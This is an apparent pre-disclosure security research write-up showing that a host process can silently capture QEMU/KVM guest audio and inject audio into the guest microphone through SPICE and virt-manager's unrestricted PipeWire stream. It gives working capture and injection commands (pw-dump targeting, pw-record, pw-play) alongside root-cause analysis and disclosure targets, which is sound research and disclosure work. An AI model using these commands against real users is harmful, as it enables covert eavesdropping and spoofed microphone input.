+++
title = "Silent Bidirectional Audio Interception Across QEMU/KVM Virtualization Boundary via SPICE and PipeWire"
date = 2026-03-26T00:00:00+00:00
[taxonomies]
tags = ["Security Research", "QEMU", "KVM", "SPICE", "PipeWire", "Virtualization", "Pre-Disclosure"]
+++

A host-level process can silently capture all VM guest audio output and inject arbitrary audio into the VM guest microphone input — across a virtualization boundary, with **complete invisibility to the guest user**, requiring **no elevated privileges**.

- **Researcher:** Gr3ytrac3 (`@thecyberdevhq`)
- **Organization:** The-OffSec-Desk
- **Date:** March 25–26, 2026
- **Host OS:** Fedora Linux
- **Guest OS:** Ubuntu 24.04
- **Hypervisor:** QEMU/KVM via libvirt

<!--more-->

> **⚠ Pre-Disclosure — Do Not Distribute**
>
> This document is an original security finding in pre-disclosure phase. Handle accordingly and do not redistribute without authorization from The-OffSec-Desk.

# 01 — Background and Initial Observation

This research originated from an audio-based post-exploitation project on Linux, which involved building tooling to capture and exfiltrate microphone audio from a compromised host. During simulation of the exploit inside a QEMU/KVM virtual machine, an unexpected observation was made: while music was playing on the host, the VM's audio capture pipeline only recorded the researcher's voice — not the host music.

This triggered a deeper question: how exactly is audio isolated between the host and the VM, and can that isolation boundary be probed or subverted? What followed was a systematic investigation of the audio stack that revealed a significant finding.

# 02 — Environment

| Component | Details |
|---|---|
| **Host** | Fedora Linux — user: `gr3ytrac3` |
| **Guest VM** | Ubuntu 24.04 — user: `cyberdevhq` |
| **Hypervisor** | QEMU/KVM managed via libvirt |
| **Audio Server** | PipeWire + WirePlumber |
| **VM Audio Device** | ICH9 Intel HDA (virtual) |
| **Display Protocol** | SPICE (port 5900, loopback) |

# 03 — Architecture Discovery

Initial investigation focused on identifying how the VM's audio hardware was configured and how it connected to the host audio system.

## VM Audio Configuration

The libvirt XML configuration showed an ICH9 sound device with no explicit audiodev backend defined:

```xml
<sound model="ich9">
  <alias name="sound0"/>
  <address type="pci" domain="0x0000" bus="0x00" slot="0x1b" function="0x0"/>
</sound>
```

## Host Audio Ownership

Running `fuser -v /dev/snd/*` on the host showed that PipeWire and WirePlumber held the audio devices — QEMU was entirely absent from direct hardware access:

```
/dev/snd/controlC0:  gr3ytrac3  3113  wireplumber
/dev/snd/seq:        gr3ytrac3  3111  pipewire
```

## QEMU Audio Backend — The Critical Discovery

Examining the full QEMU process command line revealed the actual audio backend in use:

```json
-audiodev {"id":"audio1","driver":"spice"}
-device  {"driver":"hda-duplex","id":"sound0-codec0","bus":"sound0.0","cad":0,"audiodev":"audio1"}
```

QEMU was **not** using PulseAudio or PipeWire directly. It was using **SPICE** as its audio driver. This means all VM audio travels through the SPICE display protocol, where it is received by `virt-manager` acting as the SPICE client on the host.

The full audio path through the stack:

```
VM  →  ICH9 virtual HDA  →  QEMU hda-duplex
                                    ↓
                         audiodev: driver=spice
                                    ↓
                      SPICE protocol (127.0.0.1:5900)
                                    ↓
                         virt-manager (SPICE client)
                                    ↓
                      host PipeWire graph (unrestricted)
```

# 04 — PipeWire Graph Exposure

Enumerating the host PipeWire graph revealed that `virt-manager` registered itself as a client with a critically permissive access level:

```
application.name = "virt-manager"
pipewire.access  = "unrestricted"
pipewire.sec.uid = "1000"
media.class      = "Stream/Output/Audio"   ← playback from VM
media.class      = "Stream/Input/Audio"    ← capture into VM (when mic active)
```

The `pipewire.access = "unrestricted"` flag means `virt-manager` bypasses PipeWire's portal permission system entirely. Its audio streams are visible and accessible to any process on the host that connects to the same PipeWire socket — with no authentication, no notification, and no access controls.

Two distinct nodes were identified depending on VM audio activity:

| Node | Class | Condition | Direction |
|---|---|---|---|
| `Stream/Output/Audio` | virt-manager | Any VM audio playing | VM → Host |
| `Stream/Input/Audio` | virt-manager | VM mic device open | Host → VM |

# 05 — Exploitation

## Direction 1 — Silent Capture of VM Audio Output

With something playing inside the VM, the output stream node was identified and targeted using the following host-side commands:

```bash
TARGET=$(pw-dump | python3 -c "
import json,sys
data=json.load(sys.stdin)
for obj in data:
    props = obj.get('info',{}).get('props',{})
    if props.get('application.name') == 'virt-manager' \
    and 'Stream/Output' in props.get('media.class',''):
        print(obj['id'])
")
pw-record --target $TARGET /tmp/vm_audio_captured.wav
```

A 5.5MB WAV file was written containing 30 seconds of the VM's audio output, including music playing inside the VM. Playback on the host confirmed the capture was complete and accurate.

> The VM user had **zero visibility** into this operation. No new processes appeared inside the VM, no network connections were made, and no filesystem changes occurred in the guest.

## Direction 2 — Audio Injection into VM Microphone Input

With an active microphone recording session inside the VM (`arecord` running), a second node appeared on the host — the SPICE capture channel. A 440Hz sine tone was generated and injected:

```bash
sox -n /tmp/inject_mic.wav synth 20 sine 440
pw-play --target <capture_node_id> /tmp/inject_mic.wav
```

Inside the VM, `watch -n 1 pactl list sink-inputs` immediately showed a new sink input appearing:

```
Sink Input #1116
    application.name = "pw-play"
    media.filename   = "/tmp/inject_mic.wav"
    Sink: 47
    Corked: no
```

Playback of the VM's microphone recording confirmed the injected 440Hz tone was present alongside ambient audio — the host had successfully injected audio into the VM's microphone input channel.

> **The VM cannot distinguish injected host audio from real microphone input.** From the guest's perspective, the audio arrived through the standard capture device.

# 06 — Confirmation Summary

| Result | Finding |
|:---:|---|
| ✅ | VM audio output captured silently from host |
| ✅ | Capture is completely invisible to VM guest user |
| ✅ | Arbitrary audio injected into VM microphone input |
| ✅ | Injection is completely invisible to VM guest user |
| ✅ | Node IDs change on reboot but name-based targeting is stable |
| ✅ | Host user (`gr3ytrac3`) and VM user (`cyberdevhq`) are distinct identities |
| ❌ | Network path from VM to SPICE port — blocked (loopback only) |
| ❌ | VM can reach host PipeWire socket directly — not possible |

# 07 — Root Cause Analysis

The vulnerability arises from the interaction of three design decisions that are individually reasonable but collectively produce an unintended capability.

- **SPICE audio passthrough is an intentional feature** — it allows the host user to hear and interact with VM audio.
- **`virt-manager` is a native package** that connects to PipeWire with `pipewire.access = "unrestricted"`, bypassing the XDG portal permission system that sandboxed applications must go through.
- **PipeWire applies no per-stream access controls** — any process that can connect to the session socket can enumerate and target any stream, including those belonging to `virt-manager`.

The result is that the SPICE audio channel, intended as a passthrough between the authorized SPICE viewer and the VM, is exposed as an **unprotected, bidirectional audio bridge** accessible to any co-resident host process running as the same user.

# 08 — Timeline

### 2026-03-25 — Initial Observation

Audio isolation anomaly noticed. During audio exfiltration PoC testing inside VM, host music was not captured — only researcher's voice. Investigation of host/VM audio boundary begins.

### 2026-03-25 — Architecture Mapping

SPICE audio backend identified. QEMU command line reveals `driver=spice` audiodev. `virt-manager` confirmed as the SPICE client bridging VM audio into host PipeWire graph with unrestricted access.

### 2026-03-25 23:00 — Direction 1 Confirmed ✅

`pw-record --target 71` successfully captures 30 seconds of VM audio output. 5.5MB WAV file written. Zero VM visibility confirmed.

### 2026-03-26 17:43 — Direction 2 Confirmed ✅

`pw-play --target 82` injects 440Hz sine tone into VM microphone input. Sink Input `#1116` appears inside VM. Recording confirms injected audio captured by guest. **Bidirectional channel fully demonstrated.**

* * *

# 09 — Impact Assessment

| Property | Assessment |
|---|---|
| **Attack Vector** | Host userspace — PipeWire IPC socket |
| **Privileges Required** | Same UID as `virt-manager` process on host |
| **User Interaction** | None |
| **Guest Visibility** | Zero — no processes, connections, or filesystem changes inside VM |
| **Confidentiality** | High — full VM audio stream interception |
| **Integrity** | High — arbitrary audio injected into VM microphone input |
| **Affected Boundary** | Host user identity vs VM guest user identity |

# 10 — Proposed Disclosure Targets

| Target | Rationale |
|---|---|
| **virt-manager project** | Registers SPICE audio as unrestricted PipeWire stream with no access controls |
| **libvirt security team** | No enforcement of audio isolation between host and guest user identities |
| **SPICE protocol maintainers** | Capture channel accessible beyond intended authorized viewer scope |
| **PipeWire / WirePlumber** | No per-stream access controls for unrestricted native clients |

# 11 — Further Research Directions

The following vectors were identified but not yet tested and may yield additional findings:

- **Cross-user host tap** — whether a second host user running their own VM can have their audio tapped by the first host user, which would represent privilege escalation across host user boundaries.
- **VM-triggered host audio exposure** — whether a process inside the VM can manipulate the SPICE agent to pull host audio streams into the guest, which would constitute a guest-to-host escape vector.
- **PipeWire portal bypass analysis** — whether `virt-manager`'s unrestricted access represents an intentional design decision or an unintended bypass of the XDG portal permission model.

* * *

_The-OffSec-Desk — Gr3ytrac3 — March 2026 — Pre-Disclosure, do not distribute_
